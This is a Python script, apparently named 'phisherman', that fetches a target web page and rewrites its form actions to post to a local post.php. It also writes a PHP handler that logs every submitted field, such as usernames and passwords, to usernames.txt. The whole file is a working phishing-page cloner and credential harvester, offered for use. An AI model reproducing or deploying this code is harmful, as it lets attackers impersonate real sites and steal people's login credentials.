import requests
import re
from colorama import Fore
print('''
        _     _     _                                     
       | |   (_)   | |                                    
  _ __ | |__  _ ___| |__   ___ _ __ _ __ ___   __ _ _ __  
 | '_ \| '_ \| / __| '_ \ / _ \ '__| '_ ` _ \ / _` | '_ \ 
 | |_) | | | | \__ \ | | |  __/ |  | | | | | | (_| | | | |
 | .__/|_| |_|_|___/_| |_|\___|_|  |_| |_| |_|\__,_|_| |_|
 | |                                                      
 |_|           
''')
url=input('>> ')
parameter = "action=\""
try:
  r = requests.get(url)
  print(Fore.GREEN + f"[+] Got url {url}")
except Exception as e:
  print(Fore.RED + f"[-] Error getting url {url}. Show full error? y/n")
  if input(">> ") == "y":
    print(e)
  else:
    print(Fore.RED + "process terminated")


    
print("save to .html or .txt file? h/t")
choice = input(">> ")
if choice == 'h':
  
  if parameter in r.text:
    print("parameter detected")
    
    with open('index.html', 'w') as source_code:
      print(r.text.index(parameter)) 
      source_code.write(re.sub(f'{parameter}?(.*?)\"', "action=\"post.php\"", r.text, flags=re.DOTALL))
      source_code.close()
    with open('post.php', 'w') as post:
      post.write('''
<?php $handle = fopen("usernames.txt", "a"); foreach($_POST as $variable => $value) {    fwrite($handle, $variable);    fwrite($handle, "=");    fwrite($handle, $value);    fwrite($handle, "\r\n"); } fwrite($handle, "\r\n"); fclose($handle); exit; 
?>
      ''')
  else:
    print(Fore.RED + '[-] No action parameter in url:')
    print(url)








if choice == 't' :
  if parameter in r.text:
    print("parameter detected")
    
    with open('index.txt', 'w') as source_code:
      print(r.text.index(parameter)) 
      source_code.write(re.sub(f'{parameter}?(.*?)\"', "action=\"post.php\"", r.text, flags=re.DOTALL))
      source_code.close()
      
  else:
    print(Fore.RED + '[-] No action parameter in url:')
    print(url)



else:
  if parameter in r.text:
    print("parameter detected")
    
    with open('index.php', 'w') as source_code:
      print(r.text.index(parameter)) 
      source_code.write(re.sub(f'{parameter}?(.*?)\"', "action=\"post.php\"", r.text, flags=re.DOTALL))
      source_code.close()
      
  else:
    print(Fore.RED + '[-] No action parameter in url:')
    print(url)
    


